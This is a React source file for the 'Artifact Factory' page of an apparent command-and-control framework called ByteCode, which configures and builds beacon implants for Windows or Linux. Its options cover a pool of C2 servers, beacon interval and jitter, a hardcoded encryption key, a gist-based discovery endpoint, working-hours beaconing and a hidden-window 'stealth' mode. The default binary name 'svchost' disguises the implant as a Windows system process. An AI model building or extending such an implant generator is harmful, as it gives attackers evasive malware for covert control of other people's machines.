import React, { useState } from 'react';
import { payloadsApi, API_BASE } from '../utils/api';
import { 
  Download, 
  Cpu, 
  Loader2, 
  CheckCircle, 
  AlertCircle, 
  Globe, 
  Terminal as TerminalIcon,
  Shield,
  Clock,
  Key,
  Wifi,
  Settings2,
  ChevronDown,
  ChevronUp,
  Activity,
  User
} from 'lucide-react';

const PayloadPage = () => {
  const [serverUrls, setServerUrls] = useState(() => {
    const host = window.location.hostname;
    const protocol = window.location.protocol;
    return [`${protocol}//${host}:3001`];
  });
  const [platform, setPlatform] = useState('windows');
  const [interval, setIntervalVal] = useState(10);
  const [jitter, setJitter] = useState(15);
  const [showGui, setShowGui] = useState(false);
  const [psk, setPsk] = useState('bytecode-c2-project-secret-key!!');
  const [discoveryUrl, setDiscoveryUrl] = useState('');
  const [workHoursEnabled, setWorkHoursEnabled] = useState(false);
  const [workStart, setWorkStart] = useState(9);
  const [workEnd, setWorkEnd] = useState(17);
  const [isGenerating, setIsGenerating] = useState(false);
  const [compilationLog, setCompilationLog] = useState([]);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [agentName, setAgentName] = useState('svchost');

  const startLogSimulation = () => {
    const logs = [
      "[*] Initializing Go compilation environment...",
      "[*] Pulling ByteCode agent source v2.5.0...",
      "[*] Injecting C2 configuration into internal/config/config.go...",
      `[*] Setting C2_POOL = ${serverUrls.join(',')}`,
      `[*] Setting BEACON_INTERVAL = ${interval}s`,
      `[*] Setting JITTER = ${jitter}%`,
      `[*] Setting AGENT_IDENTITY = ${agentName}`,
      workHoursEnabled ? `[*] Applying Operating Window: ${workStart}:00 - ${workEnd}:00` : "[*] Operating Window: UNRESTRICTED",
      "[*] Resolving dependencies...",
      "[*] Compiling with GOOS=" + platform + " GOARCH=amd64...",
      "[*] Stripping symbols and optimizing binary...",
      `[*] Sealing artifact as ${agentName}${platform === 'windows' ? '.exe' : ''}...`,
      "[+] Build successful. Artifact ready for deployment."
    ];
    
    setCompilationLog([]);
    logs.forEach((log, i) => {
      setTimeout(() => {
        setCompilationLog(prev => [...prev, log]);
      }, i * 400);
    });
  };

  const handleGenerate = async (e) => {
    e.preventDefault();
    setIsGenerating(true);
    setError(null);
    setResult(null);
    startLogSimulation();

    try {
      // Simulate backend delay for log effect
      await new Promise(r => setTimeout(r, 4500));
      const data = await payloadsApi.generate({
        serverUrls: serverUrls.join(','),
        showGui,
        interval,
        jitter,
        psk,
        discoveryUrl,
        agentName,
        workHours: {
          enabled: workHoursEnabled,
          start: workStart,
          end: workEnd
        }
      });
      setResult(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setIsGenerating(false);
    }
  };

  const handleDownload = () => {
    if (!result) return;
    // result.downloadUrl is e.g. /api/payloads/download/filename
    // API_BASE is e.g. http://localhost:3001/api or /api
    const baseUrl = API_BASE.endsWith('/api') ? API_BASE.slice(0, -4) : '';
    const downloadUrl = `${baseUrl}${result.downloadUrl}`;
    window.open(downloadUrl, '_blank');
  };

  return (
    <div className="flex-1 h-full overflow-y-auto p-8 bg-background scrollbar-thin">
      <header className="mb-8 flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-black text-white tracking-tight uppercase flex items-center gap-3">
            <Cpu className="w-8 h-8 text-primary" />
            Artifact Factory
          </h1>
          <p className="text-slate-500 text-xs font-bold uppercase tracking-[0.2em] mt-1 ml-1">Generate Hardened Tactical Beacons</p>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Configuration Section */}
        <div className="lg:col-span-5 flex flex-col gap-6 overflow-y-auto pr-2 scrollbar-thin">
          <div className="card p-8 border-slate-800/50 bg-surface/10 backdrop-blur-md">
            <div className="flex items-center gap-3 mb-8">
              <div className="p-2 bg-primary/10 rounded-xl border border-primary/20 text-primary">
                <Settings2 className="w-5 h-5" />
              </div>
              <span className="text-sm font-bold uppercase tracking-widest text-white">Baseline Config</span>
            </div>

            <form onSubmit={handleGenerate} className="space-y-6">
              <div className="space-y-2">
                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Architecture</label>
                <div className="grid grid-cols-2 gap-3">
                  {['windows', 'linux'].map(p => (
                    <button
                      key={p}
                      type="button"
                      onClick={() => setPlatform(p)}
                      className={`py-3 rounded-xl border text-[10px] font-black uppercase tracking-widest transition-all ${
                        platform === p ? 'bg-primary border-primary text-black' : 'bg-slate-900/50 border-slate-800 text-slate-500 hover:border-slate-700'
                      }`}
                    >
                      {p} x64
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Agent Identity (Binary Name)</label>
                <div className="relative group">
                  <User className="absolute left-4 top-3.5 w-4 h-4 text-slate-600 group-focus-within:text-primary transition-colors" />
                  <input
                    type="text"
                    value={agentName}
                    onChange={(e) => setAgentName(e.target.value)}
                    className="w-full bg-black/20 border border-slate-800/50 rounded-2xl pl-12 pr-4 py-3.5 text-xs text-white outline-none focus:border-primary/50 font-mono transition-all"
                    placeholder="e.g. svchost"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <div className="flex items-center justify-between ml-1">
                  <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest">C2 Infrastructure Pool</label>
                  <button 
                    type="button"
                    onClick={() => setServerUrls([...serverUrls, ''])}
                    className="text-[9px] font-black text-primary uppercase tracking-widest hover:text-white transition-colors"
                  >
                    + Add Host
                  </button>
                </div>
                {serverUrls.map((url, idx) => (
                  <div key={idx} className="relative group animate-in slide-in-from-left-2 duration-200">
                    <Globe className="absolute left-4 top-3.5 w-4 h-4 text-slate-600 group-focus-within:text-primary transition-colors" />
                    <input
                      type="text"
                      value={url}
                      onChange={(e) => {
                        const newUrls = [...serverUrls];
                        newUrls[idx] = e.target.value;
                        setServerUrls(newUrls);
                      }}
                      className="w-full bg-black/20 border border-slate-800/50 rounded-2xl pl-12 pr-12 py-3.5 text-xs text-white outline-none focus:border-primary/50 font-mono transition-all"
                      placeholder="https://c2-node.com"
                    />
                    {serverUrls.length > 1 && (
                      <button 
                        type="button"
                        onClick={() => setServerUrls(serverUrls.filter((_, i) => i !== idx))}
                        className="absolute right-4 top-3.5 text-slate-600 hover:text-red-400 transition-colors"
                      >
                        <AlertCircle className="w-4 h-4 rotate-45" />
                      </button>
                    )}
                  </div>
                ))}
              </div>

              <div className="grid grid-cols-2 gap-6">
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Beacon (s)</label>
                  <input
                    type="number"
                    value={interval}
                    onChange={(e) => setIntervalVal(e.target.value)}
                    className="w-full bg-black/20 border border-slate-800/50 rounded-2xl px-5 py-3.5 text-xs text-white outline-none focus:border-primary/50 font-mono"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Jitter (%)</label>
                  <input
                    type="number"
                    value={jitter}
                    onChange={(e) => setJitter(e.target.value)}
                    className="w-full bg-black/20 border border-slate-800/50 rounded-2xl px-5 py-3.5 text-xs text-white outline-none focus:border-primary/50 font-mono"
                  />
                </div>
              </div>

              {/* Advanced Toggle */}
              <button 
                type="button"
                onClick={() => setShowAdvanced(!showAdvanced)}
                className="w-full py-2 flex items-center justify-center gap-2 text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] hover:text-white transition-colors"
              >
                {showAdvanced ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
                {showAdvanced ? 'Hide Advanced Primitives' : 'Show Advanced Primitives'}
              </button>

              {showAdvanced && (
                <div className="space-y-6 pt-2 animate-in fade-in slide-in-from-top-2 duration-300">
                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Encryption PSK</label>
                    <div className="relative group">
                      <Key className="absolute left-4 top-3.5 w-4 h-4 text-slate-600 group-focus-within:text-sky-400" />
                      <input
                        type="text"
                        value={psk}
                        onChange={(e) => setPsk(e.target.value)}
                        className="w-full bg-black/20 border border-slate-800/50 rounded-2xl pl-12 pr-4 py-3.5 text-[10px] text-sky-300 outline-none focus:border-sky-500/50 font-mono"
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-1">Discovery Endpoint</label>
                    <div className="relative group">
                      <Wifi className="absolute left-4 top-3.5 w-4 h-4 text-slate-600 group-focus-within:text-emerald-400" />
                      <input
                        type="text"
                        value={discoveryUrl}
                        onChange={(e) => setDiscoveryUrl(e.target.value)}
                        className="w-full bg-black/20 border border-slate-800/50 rounded-2xl pl-12 pr-4 py-3.5 text-[10px] text-emerald-300 outline-none focus:border-emerald-500/50 font-mono"
                        placeholder="https://gist.github.com/..."
                      />
                    </div>
                  </div>

                  <div className="p-5 bg-black/20 rounded-2xl border border-slate-800/50 space-y-4">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Clock className="w-4 h-4 text-amber-500" />
                        <span className="text-[10px] font-black uppercase tracking-widest text-white">Work Hours</span>
                      </div>
                      <button 
                        type="button"
                        onClick={() => setWorkHoursEnabled(!workHoursEnabled)}
                        className={`w-8 h-4 rounded-full relative transition-colors ${workHoursEnabled ? 'bg-amber-500' : 'bg-slate-800'}`}
                      >
                        <div className={`absolute top-1 w-2 h-2 bg-white rounded-full transition-all ${workHoursEnabled ? 'left-5' : 'left-1'}`} />
                      </button>
                    </div>
                    {workHoursEnabled && (
                      <div className="grid grid-cols-2 gap-4 animate-in slide-in-from-top-2">
                        <div className="space-y-1">
                          <span className="text-[9px] font-bold text-slate-500 uppercase">Start (0-23)</span>
                          <input type="number" value={workStart} onChange={e => setWorkStart(e.target.value)} className="w-full bg-black/40 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-white" />
                        </div>
                        <div className="space-y-1">
                          <span className="text-[9px] font-bold text-slate-500 uppercase">End (0-23)</span>
                          <input type="number" value={workEnd} onChange={e => setWorkEnd(e.target.value)} className="w-full bg-black/40 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-white" />
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="p-5 bg-black/20 rounded-2xl border border-slate-800/50 flex items-center justify-between group cursor-pointer hover:border-primary/30 transition-all" onClick={() => setShowGui(!showGui)}>
                <div className="flex flex-col">
                  <span className="text-[10px] font-black uppercase tracking-widest text-white">Debug Context</span>
                  <span className="text-[9px] text-slate-600 font-bold uppercase tracking-tighter">Expose interactive terminal window</span>
                </div>
                <div className={`w-10 h-5 rounded-full relative transition-colors ${showGui ? 'bg-primary' : 'bg-slate-800'}`}>
                  <div className={`absolute top-1 w-3 h-3 bg-white rounded-full transition-all ${showGui ? 'left-6' : 'left-1'}`} />
                </div>
              </div>

              <button
                type="submit"
                disabled={isGenerating}
                className="w-full py-4 rounded-2xl bg-primary text-black text-sm font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all flex items-center justify-center gap-3 shadow-lg shadow-primary/10 disabled:opacity-50"
              >
                {isGenerating ? <Loader2 className="w-5 h-5 animate-spin" /> : <Shield className="w-5 h-5" />}
                Authorize Build
              </button>
            </form>
          </div>
        </div>

        {/* Console & Result Section */}
        <div className="lg:col-span-7 flex flex-col gap-6">
          <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50 bg-surface/10 backdrop-blur-md">
            <div className="px-6 py-4 border-b border-slate-800/50 flex items-center justify-between bg-white/5">
              <div className="flex items-center gap-3">
                <Activity className="w-4 h-4 text-primary animate-pulse" />
                <span className="text-[10px] font-black uppercase tracking-[0.2em] text-white">Factory Telemetry</span>
              </div>
              <span className="text-[9px] font-mono text-slate-500">CHANNEL_STABLE_V5</span>
            </div>
            <div className="flex-1 p-8 font-mono text-[11px] space-y-3 overflow-y-auto scrollbar-thin">
              {compilationLog.map((line, i) => (
                <div key={i} className="animate-in fade-in slide-in-from-left-2 duration-300">
                  <span className="text-slate-600 mr-3 opacity-50">{new Date().toLocaleTimeString()}</span>
                  <span className={line.startsWith('[+]') ? 'text-emerald-400 font-bold' : line.startsWith('[*]') ? 'text-primary/80' : 'text-slate-400'}>
                    {line}
                  </span>
                </div>
              ))}
              {!isGenerating && compilationLog.length === 0 && (
                <div className="h-full flex flex-col items-center justify-center opacity-10 select-none grayscale">
                  <TerminalIcon className="w-20 h-20 mb-6" />
                  <p className="text-[11px] uppercase tracking-[0.3em] font-black">Awaiting Authorization...</p>
                </div>
              )}
              {isGenerating && <div className="w-1.5 h-5 bg-primary animate-pulse inline-block ml-1 align-middle" />}
            </div>
          </div>

          <div className="card p-8 border-slate-800/50 bg-surface/10 backdrop-blur-sm">
            <div className="flex items-center gap-3 mb-6">
              <span className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Artifact Manifest</span>
            </div>
            <pre className="text-[11px] font-mono text-primary/70 bg-black/40 p-6 rounded-2xl border border-primary/10 overflow-x-auto scrollbar-thin">
{JSON.stringify({
  identity: agentName,
  architecture: platform,
  c2_pool: serverUrls,
  beacon_window: `${interval}s [Jitter: ${jitter}%]`,
  encryption: "AES-256-GCM [RSA-4096 Keys]",
  stealth_mode: showGui ? "DEBUG" : "STARK",
  work_hours: workHoursEnabled ? `${workStart}:00-${workEnd}:00` : "24/7",
  discovery: discoveryUrl || "STATIC",
  version: "1.5.0-STABLE"
}, null, 2)}
            </pre>
          </div>

          {result && (
            <div className="card p-8 border-emerald-500/30 bg-emerald-500/5 animate-in zoom-in duration-500">
              <div className="flex items-center justify-between gap-8">
                <div className="flex items-center gap-5">
                  <div className="p-4 bg-emerald-500/20 rounded-3xl border border-emerald-500/30 text-emerald-400">
                    <CheckCircle className="w-8 h-8" />
                  </div>
                  <div>
                    <h3 className="text-xl font-black text-white uppercase tracking-tight">Artifact Sealed</h3>
                    <p className="text-sm font-mono text-emerald-500/70 mt-1">{result.filename}</p>
                  </div>
                </div>
                <button
                  onClick={handleDownload}
                  className="px-10 py-4 rounded-2xl bg-emerald-500 text-black text-xs font-black uppercase tracking-[0.2em] hover:bg-emerald-400 transition-all flex items-center gap-4 shadow-xl shadow-emerald-500/20"
                >
                  <Download className="w-5 h-5" />
                  Extract Payload
                </button>
              </div>
            </div>
          )}

          {error && (
            <div className="card p-8 border-red-500/30 bg-red-500/5 animate-in slide-in-from-bottom-4 duration-500">
              <div className="flex items-center gap-5">
                <div className="p-4 bg-red-500/20 rounded-3xl border border-red-500/30 text-red-400">
                  <AlertCircle className="w-8 h-8" />
                </div>
                <div>
                  <h3 className="text-xl font-black text-white uppercase tracking-tight">Build Violation</h3>
                  <p className="text-sm font-bold text-red-500/70 uppercase tracking-widest mt-1">{error}</p>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default PayloadPage;
